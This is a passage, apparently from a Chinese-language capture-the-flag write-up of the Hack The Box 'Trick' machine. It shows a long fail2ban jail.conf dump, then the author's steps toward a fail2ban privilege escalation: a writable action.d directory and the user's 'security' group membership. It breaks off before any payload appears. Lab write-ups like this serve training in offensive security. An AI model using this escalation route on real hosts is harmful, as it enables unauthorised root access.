%(sshd_log)s<br>backend = %(sshd_backend)s<br>bantime = 10s<br><br>[dropbear]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = ssh<br>logpath  = %(dropbear_log)s<br>backend  = %(dropbear_backend)s<br><br><br>[selinux-ssh]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = ssh<br>logpath  = %(auditd_log)s<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># HTTP servers</span><br><span class="hljs-comment">#</span><br><br>[apache-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = %(apache_error_log)s<br><br><br>[apache-badbots]<br><span class="hljs-comment"># Ban hosts which agent identifies spammer robots crawling the web</span><br><span class="hljs-comment"># for email addresses. The mail outputs are buffered.</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = %(apache_access_log)s<br>bantime  = 48h<br>maxretry = 1<br><br><br>[apache-noscript]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = %(apache_error_log)s<br><br><br>[apache-overflows]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = %(apache_error_log)s<br>maxretry = 2<br><br><br>[apache-nohome]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = %(apache_error_log)s<br>maxretry = 2<br><br><br>[apache-botsearch]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = %(apache_error_log)s<br>maxretry = 2<br><br><br>[apache-fakegooglebot]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = %(apache_access_log)s<br>maxretry = 1<br>ignorecommand = %(ignorecommands_dir)s/apache-fakegooglebot &lt;ip&gt;<br><br><br>[apache-modsecurity]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = %(apache_error_log)s<br>maxretry = 2<br><br><br>[apache-shellshock]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = http,https<br>logpath = %(apache_error_log)s<br>maxretry = 1<br><br><br>[openhab-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">filter </span>= openhab<br>action = iptables-allports[<span class="hljs-attribute">name</span>=NoAuthFailures]<br>logpath = /opt/openhab/logs/request.log<br><br><br>[nginx-http-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = http,https<br>logpath = %(nginx_error_log)s<br><br><span class="hljs-comment"># To use &#x27;nginx-limit-req&#x27; jail you should have `ngx_http_limit_req_module` </span><br><span class="hljs-comment"># and define `limit_req` and `limit_req_zone` as described in nginx documentation</span><br><span class="hljs-comment"># http://nginx.org/en/docs/http/ngx_http_limit_req_module.html</span><br><span class="hljs-comment"># or for example see in &#x27;config/filter.d/nginx-limit-req.conf&#x27;</span><br>[nginx-limit-req]<span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = http,https<br>logpath = %(nginx_error_log)s<br><br>[nginx-botsearch]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = %(nginx_error_log)s<br>maxretry = 2<br><br><br><span class="hljs-comment"># Ban attackers that try to use PHP&#x27;s URL-fopen() functionality</span><br><span class="hljs-comment"># through GET/POST variables. - Experimental, with more than a year</span><br><span class="hljs-comment"># of usage in production environments.</span><br><br>[php-url-fopen]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = http,https<br>logpath = %(nginx_access_log)s<br>          %(apache_access_log)s<br><br><br>[suhosin]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = http,https<br>logpath = %(suhosin_log)s<br><br><br>[lighttpd-auth]<br><span class="hljs-comment"># Same as above for Apache&#x27;s mod_auth</span><br><span class="hljs-comment"># It catches wrong authentifications</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = http,https<br>logpath = %(lighttpd_error_log)s<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Webmail and groupware servers</span><br><span class="hljs-comment">#</span><br><br>[roundcube-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = %(roundcube_errors_log)s<br><span class="hljs-comment"># Use following line in your jail.local if roundcube logs to journal.</span><br><span class="hljs-comment">#backend = %(syslog_backend)s</span><br><br><br>[openwebmail]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = /var/log/openwebmail.log<br><br><br>[horde]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = /var/log/horde/horde.log<br><br><br>[groupoffice]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = /home/groupoffice/log/info.log<br><br><br>[sogo-auth]<br><span class="hljs-comment"># Monitor SOGo groupware server</span><br><span class="hljs-comment"># without proxy this would be:</span><br><span class="hljs-comment"># port    = 20000</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = /var/log/sogo/sogo.log<br><br><br>[tine20]<br><br>logpath  = /var/log/tine20/tine20.log<span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Web Applications</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><br>[drupal-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = %(syslog_daemon)s<br>backend  = %(syslog_backend)s<br><br>[guacamole]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = http,https<br>logpath  = /var/log/tomcat*/catalina.out<br><br>[monit]<br><span class="hljs-comment">#Ban clients brute-forcing the monit gui login</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>= 2812<br>logpath  = /var/log/monit<br><br><br>[webmin-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = 10000<br>logpath = %(syslog_authpriv)s<br>backend = %(syslog_backend)s<br><br><br>[froxlor-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = http,https<br>logpath  = %(syslog_authpriv)s<br>backend  = %(syslog_backend)s<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># HTTP Proxy servers</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><br>[squid]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    =  80,443,3128,8080<br>logpath = /var/log/squid/access.log<br><br><br>[3proxy]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = 3128<br>logpath = /var/log/3proxy.log<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># FTP servers</span><br><span class="hljs-comment">#</span><br><br><br>[proftpd]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = ftp,ftp-data,ftps,ftps-data<br>logpath  = %(proftpd_log)s<br>backend  = %(proftpd_backend)s<br><br><br>[pure-ftpd]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = ftp,ftp-data,ftps,ftps-data<br>logpath  = %(pureftpd_log)s<br>backend  = %(pureftpd_backend)s<br><br><br>[gssftpd]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = ftp,ftp-data,ftps,ftps-data<br>logpath  = %(syslog_daemon)s<br>backend  = %(syslog_backend)s<br><br><br>[wuftpd]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = ftp,ftp-data,ftps,ftps-data<br>logpath  = %(wuftpd_log)s<br>backend  = %(wuftpd_backend)s<br><br><br>[vsftpd]<br><span class="hljs-comment"># or overwrite it in jails.local to be</span><br><span class="hljs-comment"># logpath = %(syslog_authpriv)s</span><br><span class="hljs-comment"># if you want to rely on PAM failed login attempts</span><br><span class="hljs-comment"># vsftpd&#x27;s failregex should match both of those formats</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = ftp,ftp-data,ftps,ftps-data<br>logpath  = %(vsftpd_log)s<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Mail servers</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-comment"># ASSP SMTP Proxy Jail</span><br>[assp]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = smtp,465,submission<br>logpath  = /root/path/<span class="hljs-keyword">to</span>/assp/logs/maillog.txt<br><br><br>[courier-smtp]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = smtp,465,submission<br>logpath  = %(syslog_mail)s<br>backend  = %(syslog_backend)s<br><br><br>[postfix]<br><span class="hljs-comment"># To use another modes set filter parameter &quot;mode&quot; in jail.local:</span><br>mode    = more<span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = smtp,465,submission<br>logpath = %(postfix_log)s<br>backend = %(postfix_backend)s<br><br><br>[postfix-rbl]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">filter </span>  = postfix[<span class="hljs-attribute">mode</span>=rbl]<span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = smtp,465,submission<br>logpath  = %(postfix_log)s<br>backend  = %(postfix_backend)s<br>maxretry = 1<br><br><br>[sendmail-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = submission,465,smtp<br>logpath = %(syslog_mail)s<br>backend = %(syslog_backend)s<br><br><br>[sendmail-reject]<br><span class="hljs-comment"># To use more aggressive modes set filter parameter &quot;mode&quot; in jail.local:</span><br><span class="hljs-comment"># normal (default), extra or aggressive</span><br><span class="hljs-comment"># See &quot;tests/files/logs/sendmail-reject&quot; or &quot;filter.d/sendmail-reject.conf&quot; for usage example and details.</span><br><span class="hljs-comment">#mode    = normal</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = smtp,465,submission<br>logpath  = %(syslog_mail)s<br>backend  = %(syslog_backend)s<br><br><br>[qmail-rbl]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">filter </span> = qmail<span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = smtp,465,submission<br>logpath = /service/qmail/log/main/current<br><br><br><span class="hljs-comment"># dovecot defaults to logging to the mail syslog facility</span><br><span class="hljs-comment"># but can be set by syslog_facility in the dovecot configuration.</span><br>[dovecot]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = pop3,pop3s,imap,imaps,submission,465,sieve<br>logpath = %(dovecot_log)s<br>backend = %(dovecot_backend)s<br><br><br>[sieve]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>  = smtp,465,submission<br>logpath = %(dovecot_log)s<br>backend = %(dovecot_backend)s<br><br><br>[solid-pop3d]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = pop3,pop3s<br>logpath = %(solidpop3d_log)s<br><br><br>[exim]<br><span class="hljs-comment"># see filter.d/exim.conf for further modes supported from filter:</span><br><span class="hljs-comment">#mode = normal</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>  = smtp,465,submission<br>logpath = %(exim_main_log)s<br><br><br>[exim-spam]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>  = smtp,465,submission<br>logpath = %(exim_main_log)s<br><br><br>[kerio]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = imap,smtp,imaps,465<br>logpath = /opt/kerio/mailserver/store/logs/security.log<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Mail servers authenticators: might be used for smtp,ftp,imap servers, so</span><br><span class="hljs-comment"># all relevant ports get banned</span><br><span class="hljs-comment">#</span><br><br>[courier-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = smtp,465,submission,imap,imaps,pop3,pop3s<br>logpath  = %(syslog_mail)s<br>backend  = %(syslog_backend)s<br><br><br>[postfix-sasl]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">filter </span>  = postfix[<span class="hljs-attribute">mode</span>=auth]<span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = smtp,465,submission,imap,imaps,pop3,pop3s<br><span class="hljs-comment"># You might consider monitoring /var/log/mail.warn instead if you are</span><br><span class="hljs-comment"># running postfix since it would provide the same log lines at the</span><br><span class="hljs-comment"># &quot;warn&quot; level but overall at the smaller filesize.</span><br>logpath  = %(postfix_log)s<br>backend  = %(postfix_backend)s<br><br><br>[perdition]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>  = imap,imaps,pop3,pop3s<br>logpath = %(syslog_mail)s<br>backend = %(syslog_backend)s<br><br><br>[squirrelmail]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>= smtp,465,submission,imap,imap2,imaps,pop3,pop3s,http,https,socks<br>logpath = /var/lib/squirrelmail/prefs/squirrelmail_access_log<br><br><br>[cyrus-imap]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>  = imap,imaps<br>logpath = %(syslog_mail)s<br>backend = %(syslog_backend)s<br><br><br>[uwimap-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>  = imap,imaps<br>logpath = %(syslog_mail)s<br>backend = %(syslog_backend)s<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># DNS servers</span><br><span class="hljs-comment">#</span><br><br><br><span class="hljs-comment"># !!! WARNING !!!</span><br><span class="hljs-comment">#   Since UDP is connection-less protocol, spoofing of IP and imitation</span><br><span class="hljs-comment">#   of illegal actions is way too simple.  Thus enabling of this filter</span><br><span class="hljs-comment">#   might provide an easy way for implementing a DoS against a chosen</span><br><span class="hljs-comment">#   victim. See</span><br><span class="hljs-comment">#    http://nion.modprobe.de/blog/archives/690-fail2ban-+-dns-fail.html</span><br><span class="hljs-comment">#   Please DO NOT USE this jail unless you know what you are doing.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># IMPORTANT: see filter.d/named-refused for instructions to enable logging</span><br><span class="hljs-comment"># This jail blocks UDP traffic for DNS requests.</span><br><span class="hljs-comment"># [named-refused-udp]</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># filter   = named-refused</span><br><span class="hljs-comment"># port     = domain,953</span><br><span class="hljs-comment"># protocol = udp</span><br><span class="hljs-comment"># logpath  = /var/log/named/security.log</span><br><br><span class="hljs-comment"># IMPORTANT: see filter.d/named-refused for instructions to enable logging</span><br><span class="hljs-comment"># This jail blocks TCP traffic for DNS requests.</span><br><br>[named-refused]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = domain,953<br>logpath  = /var/log/named/security.log<br><br><br>[nsd]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = 53<br>action   = %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s-tcp, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>, <span class="hljs-attribute">actname</span>=%(banaction)s-tcp]<br>           %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s-udp, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;udp&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>, <span class="hljs-attribute">actname</span>=%(banaction)s-udp]<br>logpath = /var/log/nsd.log<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Miscellaneous</span><br><span class="hljs-comment">#</span><br><br>[asterisk]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = 5060,5061<br>action   = %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s-tcp, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>, <span class="hljs-attribute">actname</span>=%(banaction)s-tcp]<br>           %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s-udp, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;udp&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>, <span class="hljs-attribute">actname</span>=%(banaction)s-udp]<br>           %(mta)s-whois[<span class="hljs-attribute">name</span>=%(__name__)s, <span class="hljs-attribute">dest</span>=<span class="hljs-string">&quot;%(destemail)s&quot;</span>]<br>logpath  = /var/log/asterisk/messages<br>maxretry = 10<br><br><br>[freeswitch]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = 5060,5061<br>action   = %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s-tcp, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>, <span class="hljs-attribute">actname</span>=%(banaction)s-tcp]<br>           %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s-udp, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;udp&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>, <span class="hljs-attribute">actname</span>=%(banaction)s-udp]<br>           %(mta)s-whois[<span class="hljs-attribute">name</span>=%(__name__)s, <span class="hljs-attribute">dest</span>=<span class="hljs-string">&quot;%(destemail)s&quot;</span>]<br>logpath  = /var/log/freeswitch.log<br>maxretry = 10<br><br><br><span class="hljs-comment"># To log wrong MySQL access attempts add to /etc/my.cnf in [mysqld] or</span><br><span class="hljs-comment"># equivalent section:</span><br><span class="hljs-comment"># log-warning = 2</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># for syslog (daemon facility)</span><br><span class="hljs-comment"># [mysqld_safe]</span><br><span class="hljs-comment"># syslog</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># for own logfile</span><br><span class="hljs-comment"># [mysqld]</span><br><span class="hljs-comment"># log-error=/var/log/mysqld.log</span><br>[mysqld-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = 3306<br>logpath  = %(mysql_log)s<br>backend  = %(mysql_backend)s<br><br><br><span class="hljs-comment"># Log wrong MongoDB auth (for details see filter &#x27;filter.d/mongodb-auth.conf&#x27;)</span><br>[mongodb-auth]<br><span class="hljs-comment"># change port when running with &quot;--shardsvr&quot; or &quot;--configsvr&quot; runtime operation</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = 27017<br>logpath  = /var/log/mongodb/mongodb.log<br><br><br><span class="hljs-comment"># Jail for more extended banning of persistent abusers</span><br><span class="hljs-comment"># !!! WARNINGS !!!</span><br><span class="hljs-comment"># 1. Make sure that your loglevel specified in fail2ban.conf/.local</span><br><span class="hljs-comment">#    is not at DEBUG level -- which might then cause fail2ban to fall into</span><br><span class="hljs-comment">#    an infinite loop constantly feeding itself with non-informative lines</span><br><span class="hljs-comment"># 2. Increase dbpurgeage defined in fail2ban.conf to e.g. 648000 (7.5 days)</span><br><span class="hljs-comment">#    to maintain entries for failed logins for sufficient amount of time</span><br>[recidive]<br><br>logpath  = /var/log/fail2ban.log<br>banaction = %(banaction_allports)s<br>bantime  = 1w<br>findtime = 1d<br><br><br><span class="hljs-comment"># Generic filter for PAM. Has to be used with action which bans all</span><br><span class="hljs-comment"># ports such as iptables-allports, shorewall</span><br><br>[pam-generic]<br><span class="hljs-comment"># pam-generic filter can be customized to monitor specific subset of &#x27;tty&#x27;s</span><br>banaction = %(banaction_allports)s<br>logpath  = %(syslog_authpriv)s<br>backend  = %(syslog_backend)s<br><br><br>[xinetd-fail]<br><br>banaction = iptables-multiport-log<br>logpath   = %(syslog_daemon)s<br>backend   = %(syslog_backend)s<br>maxretry  = 2<br><br><br><span class="hljs-comment"># stunnel - need to set port for this</span><br>[stunnel]<br><br>logpath = /var/log/stunnel4/stunnel.log<br><br><br>[ejabberd-auth]<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = 5222<br>logpath = /var/log/ejabberd/ejabberd.log<br><br><br>[counter-strike]<br><br>logpath = /opt/cstrike/logs/L[0-9]*.log<br><span class="hljs-comment"># Firewall: http://www.cstrike-planet.com/faq/6</span><br>tcpport = 27030,27031,27032,27033,27034,27035,27036,27037,27038,27039<br>udpport = 1200,27000,27001,27002,27003,27004,27005,27006,27007,27008,27009,27010,27011,27012,27013,27014,27015<br>action  = %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s-tcp, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(tcpport)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>, <span class="hljs-attribute">actname</span>=%(banaction)s-tcp]<br>           %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s-udp, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(udpport)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;udp&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>, <span class="hljs-attribute">actname</span>=%(banaction)s-udp]<br><br><span class="hljs-comment"># consider low maxretry and a long bantime</span><br><span class="hljs-comment"># nobody except your own Nagios server should ever probe nrpe</span><br>[nagios]<br><br>logpath  = %(syslog_daemon)s     ; nrpe.cfg may define a different log_facility<br>backend  = %(syslog_backend)s<br>maxretry = 1<br><br><br>[oracleims]<br><span class="hljs-comment"># see &quot;oracleims&quot; filter file for configuration requirement for Oracle IMS v6 and above</span><br>logpath = /opt/sun/comms/messaging64/log/mail.log_current<br>banaction = %(banaction_allports)s<br><br>[directadmin]<br>logpath = /var/log/directadmin/login.log<span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>= 2222<br><br>[portsentry]<br>logpath  = /var/lib/portsentry/portsentry.history<br>maxretry = 1<br><br>[pass2allow-ftp]<br><span class="hljs-comment"># this pass2allow example allows FTP traffic after successful HTTP authentication</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>        = ftp,ftp-data,ftps,ftps-data<br><span class="hljs-comment"># knocking_url variable must be overridden to some secret value in jail.local</span><br>knocking_url = /knocking/<span class="hljs-built_in"></span><br><span class="hljs-built_in">filter </span>      = apache-pass[<span class="hljs-attribute">knocking_url</span>=<span class="hljs-string">&quot;%(knocking_url)s&quot;</span>]<br><span class="hljs-comment"># access log of the website with HTTP auth</span><br>logpath      = %(apache_access_log)s<br>blocktype    = RETURN<br>returntype   = DROP<br>action       = %(action_)s[<span class="hljs-attribute">blocktype</span>=%(blocktype)s, <span class="hljs-attribute">returntype</span>=%(returntype)s]<br>bantime      = 1h<br>maxretry     = 1<br>findtime     = 1<br><br><br>[murmur]<br><span class="hljs-comment"># AKA mumble-server</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>    = 64738<br>action   = %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s-tcp, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=tcp, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>, <span class="hljs-attribute">actname</span>=%(banaction)s-tcp]<br>           %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s-udp, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=udp, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>, <span class="hljs-attribute">actname</span>=%(banaction)s-udp]<br>logpath  = /var/log/mumble-server/mumble-server.log<br><br><br>[screensharingd]<br><span class="hljs-comment"># For Mac OS Screen Sharing Service (VNC)</span><br>logpath  = /var/log/system.log<br>logencoding = utf-8<br><br>[haproxy-http-auth]<br><span class="hljs-comment"># HAProxy by default doesn&#x27;t log to file you&#x27;ll need to set it up to forward</span><br><span class="hljs-comment"># logs to a syslog server which would then write them to disk.</span><br><span class="hljs-comment"># See &quot;haproxy-http-auth&quot; filter for a brief cautionary note when setting</span><br><span class="hljs-comment"># maxretry and findtime.</span><br>logpath  = /var/log/haproxy.log<br><br>[slapd]<span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = ldap,ldaps<br>logpath = /var/log/slapd.log<br><br>[domino-smtp]<span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = smtp,ssmtp<br>logpath = /home/domino01/data/IBM_TECHNICAL_SUPPORT/console.log<br><br>[phpmyadmin-syslog]<span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = http,https<br>logpath = %(syslog_authpriv)s<br>backend = %(syslog_backend)s<br><br><br>[zoneminder]<br><span class="hljs-comment"># Zoneminder HTTP/HTTPS web interface auth</span><br><span class="hljs-comment"># Logs auth failures to apache2 error log</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = http,https<br>logpath = %(apache_error_log)s<br><br>michael@trick:/etc/fail2ban$ <br></code></pre></td></tr></table></figure>

<p>28、这里，通过谷歌，疑似发现了提权的手法</p>
<p><code>https://juggernaut-sec.com/fail2ban-lpe/</code></p>
<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
<p>29、开始根据文章进行尝试登录</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">michael@trick:/etc/fail2ban$ cd /etc/fail2ban &amp;&amp; ls -l<br>total 60<br>drwxrwx---<span class="hljs-number"> 2 </span>root security <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 25 </span>10:12 action.d<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root     <span class="hljs-number"> 2334 </span>Sep<span class="hljs-number"> 25 </span>10:12 fail2ban.conf<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root     <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 25 </span>10:12 fail2ban.d<br>drwxr-xr-x<span class="hljs-number"> 3 </span>root root     <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 25 </span>10:12 filter.d<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 22908 </span>Sep<span class="hljs-number"> 25 </span>10:12 jail.conf<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root     <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 25 </span>10:12 jail.d<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 645 </span>Sep<span class="hljs-number"> 25 </span>10:12 paths-arch.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root     <span class="hljs-number"> 2827 </span>Sep<span class="hljs-number"> 25 </span>10:12 paths-common.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 573 </span>Sep<span class="hljs-number"> 25 </span>10:12 paths-debian.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 738 </span>Sep<span class="hljs-number"> 25 </span>10:12 paths-opensuse.conf<br>michael@trick:/etc/fail2ban$ id<br>uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)<br>michael@trick:/etc/fail2ban$ <br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/12.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tap">michael@trick:/etc/fail2ban/action.d$ ls -la iptables*<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1426 </span>Sep<span class="hljs-number"> 25 </span>10:18 iptables-allports.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2738 </span>Sep<span class="hljs-number"> 25 </span>10:18 iptables-common.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1339 </span>Sep<span class="hljs-number"> 25 </span>10:18 iptables.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2000 </span>Sep<span class="hljs-number"> 25 </span>10:18 iptables-ipset-proto4.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2197 </span>Sep<span class="hljs-number"> 25 </span>10:18 iptables-ipset-proto6-allports.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2240 </span>Sep<span class="hljs-number"> 25 </span>10:18 